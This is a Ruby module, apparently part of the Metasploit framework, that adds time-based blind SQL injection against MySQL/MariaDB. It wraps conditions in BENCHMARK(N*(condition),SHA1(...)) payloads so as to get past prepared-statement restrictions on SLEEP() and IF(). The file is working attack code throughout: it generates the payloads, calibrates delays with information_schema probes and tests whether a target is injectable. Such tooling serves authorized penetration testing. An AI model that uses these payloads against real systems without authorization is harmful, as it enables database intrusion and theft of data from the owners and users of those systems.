#
#   Time-Based Blind SQL injection support for MySQL/MariaDB using BENCHMARK()
#   instead of SLEEP(). This is useful when the target application's database
#   abstraction layer uses prepared statements that prevent SLEEP() and also
#   reject subqueries inside IF(condition, BENCHMARK(...), 0).
#
#   Uses BENCHMARK(N * (condition), SHA1(rand)) instead of IF(), which embeds
#   the boolean condition as a multiplier on the iteration count. When condition
#   evaluates to 1 (true), BENCHMARK runs N iterations causing a delay; when 0
#   (false), it runs 0 iterations and returns instantly.
#
#   The iteration count is calibrated at runtime using a probe with the same
#   multiplication structure to account for any overhead from prepared statements.
#
class Msf::Exploit::SQLi::MySQLi::BenchmarkBasedBlind < Msf::Exploit::SQLi::MySQLi::Common
  include ::Msf::Exploit::SQLi::TimeBasedBlindMixin

  #
  # Wraps a boolean condition into a BENCHMARK multiplication payload.
  # BENCHMARK(N * (condition), SHA1(rand)) - delays when condition is true (1),
  # instant when false (0). This bypasses prepare() limitations that reject
  # subqueries inside IF(condition, BENCHMARK(...), 0).
  # @param condition [String] A SQL boolean expression
  # @return [String] The BENCHMARK multiplication payload
  #
  def time_blind_payload(condition)
    calibrate unless @benchmark_iterations
    "BENCHMARK(#{@benchmark_iterations}*(#{condition}),SHA1(0x#{Rex::Text.rand_text_hex(8)}))"
  end

  #
  # Override test_vulnerable to use table subquery conditions that match the cost
  # profile of real extraction payloads. Simple conditions like (SELECT 1)=1 cost
  # ~10x more per iteration than table subqueries due to MySQL's prepare() handling,
  # causing massive delay overshoot with the calibrated iteration count.
  #
  def test_vulnerable
    out_true = blind_request(time_blind_payload('(SELECT count(1) from information_schema.schemata)>0'))
    out_false = blind_request(time_blind_payload('(SELECT count(1) from information_schema.schemata)<0'))
    out_true && !out_false
  end

  private

  #
  # Calibrates the number of BENCHMARK iterations to match SqliDelay.
  # Uses the same multiplication structure as extraction payloads to account
  # for any overhead from prepared statement evaluation of the expression.
  #
  def calibrate
    target_delay = datastore['SqliDelay'].to_f
    probe_iterations = 1_000_000
    vprint_status "{SQLi} Calibrating BENCHMARK iterations for #{target_delay}s delay..."

    # Probe with a real subquery to match the actual extraction workload.
    # Simple expressions like *(SELECT 1) or *(1=1) overestimate cost per iteration
    # because MySQL's prepare() optimizes them differently than real table subqueries,
    # leading to calibrated iterations that are ~8x too low.
    start = Time.now
    @query_proc.call("BENCHMARK(#{probe_iterations}*(ord(mid(cast((select schema_name from information_schema.schemata limit 0,1) as binary),1,1))>0),SHA1(0x#{Rex::Text.rand_text_hex(8)}))")
    elapsed = Time.now - start

    if elapsed <= 0
      vprint_warning '{SQLi} Calibration probe returned in zero time, using safe default iterations'
      @benchmark_iterations = probe_iterations
      return
    end

    # Scale to 3x the target delay so that actual execution reliably exceeds SqliDelay.
    # The 3x margin accounts for CPU variance, network jitter, and the fact that
    # information_schema probes are slightly heavier than typical user-table queries.
    raw = ((target_delay * 3.0 / elapsed) * probe_iterations).to_i
    @benchmark_iterations = raw.clamp(100_000, 500_000_000)

    vprint_status "{SQLi} Probe: #{probe_iterations} iterations took #{elapsed.round(3)}s"
    vprint_status "{SQLi} Calibrated: #{@benchmark_iterations} iterations for ~#{target_delay}s delay"
  end
end
